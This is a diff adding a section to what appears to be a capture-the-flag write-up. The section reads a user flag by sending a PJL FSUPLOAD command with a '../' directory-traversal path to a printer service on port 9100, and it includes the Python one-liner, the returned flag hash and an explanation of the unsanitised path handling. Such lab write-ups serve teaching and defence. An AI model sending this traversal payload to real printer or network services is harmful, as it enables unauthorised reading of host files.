@@ -661,6 +661,53 @@ lp@paperwork:/opt/LPDServer$
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.3 Read `user.txt` via PJL Directory Traversal (FSUPLOAD)
+
+**Command:**
+
+```python
+python3 -c "
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 9100))
+payload = b'@PJL FSUPLOAD NAME=\"../../../../home/archivist/user.txt\"\n'
+s.send(payload)
+data = s.recv(4096)
+print(data.decode(errors='ignore'))
+s.close()
+"
+```
+
+**Breakdown:**
+
+- `@PJL FSUPLOAD NAME="..."`
+    - **Description:** PJL file-system command that reads ("uploads") a file from the printer's storage back to the client.
+    - **Purpose:** Retrieve a file's contents through the JetDirect service, using the daemon's own file-access privileges rather than the `lp` user's.
+- `../../../../`
+    - **Description:** Sequence of parent-directory references prepended to the path.
+    - **Purpose:** Escape the printer's virtual filesystem root and traverse into the real host filesystem, reaching `/home/archivist/user.txt` — a file `lp` cannot read directly.
+
+**Result:**
+
+```shell
+@PJL FSUPLOAD NAME="../../../../home/archivist/user.txt" SIZE=33
+258e58dd504a4d54beb86f188ee362e8
+```
+
+**Key finding — USER FLAG captured via directory traversal:** The PJL implementation fails to constrain `FSUPLOAD` paths, allowing arbitrary host-file reads. The service reads with higher privilege than `lp`, exposing `archivist`'s `user.txt`.
+
+**USER FLAG:** `258e58dd504a4d54beb86f188ee362e8`
+
+**Theory block — PJL directory traversal:** PJL file commands are meant to operate inside the printer's own storage namespace. A hardened implementation resolves and confines every `NAME=` path to that root. This custom service concatenates the client path onto its base without canonicalizing it, so a `../` chain walks up past the intended root into the host's real directory tree. It's the printer-protocol equivalent of classic web path traversal (`GET /../../etc/passwd`) — same flaw, different protocol.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
